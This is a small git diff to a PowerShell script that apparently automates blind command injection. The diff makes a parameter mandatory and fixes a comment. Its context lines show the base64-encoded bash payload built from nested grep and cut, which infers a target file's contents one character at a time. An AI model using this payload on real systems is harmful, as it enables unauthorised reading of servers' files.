@@ -29,6 +29,7 @@ $all_characters = $lowercaseChars + $uppercaseChars + $numbers
 
 function Send_Command {
     param (
+        [Parameter(Mandatory = $true)]
         [string]$command
     )
     if ($command) {
@@ -47,7 +48,7 @@ $BlindInjectionCommand = 'cut -c 2 <<<$(grep $(grep $(grep $(echo $1) <<<$(cut -
 #'cut -c 2 <<<$(grep $(grep $(grep $(echo $1) <<<$(cut -c $2 $3)) <<<$(echo $1)) <<<$(echo $1\B))'
 #    					  '$(cut -c 2 <<<$(grep $(grep $(grep $(echo $1) <<<$(cut -c $2 $3)) <<<$(echo $1)) <<<$(echo $1\B)))'
 
-#Convert the Command the be execute like $(bash $BlindInjectionCommand $ARG1 $ARG2 $ARG3)
+#Convert the Command to be executed like $(bash $BlindInjectionCommand $ARG1 $ARG2 $ARG3)
 $Bytes = [System.Text.Encoding]::UTF8.GetBytes($BlindInjectionCommand)
 $b64BASHCOMMAND = [Convert]::ToBase64String($Bytes)
 
